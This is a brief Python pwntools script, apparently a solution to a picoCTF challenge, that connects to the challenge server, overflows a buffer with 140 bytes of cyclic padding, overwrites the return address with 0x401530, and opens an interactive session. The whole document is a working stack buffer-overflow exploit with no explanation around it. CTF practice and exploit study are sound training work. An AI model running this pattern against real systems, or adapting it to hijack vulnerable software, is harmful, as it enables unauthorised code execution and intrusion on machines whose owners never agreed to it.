from pwn import *

io = remote('saturn.picoctf.net', 51680)

io.sendafter(b'Give me a string!', cyclic(140) + p32(0x401530))

io.interactive()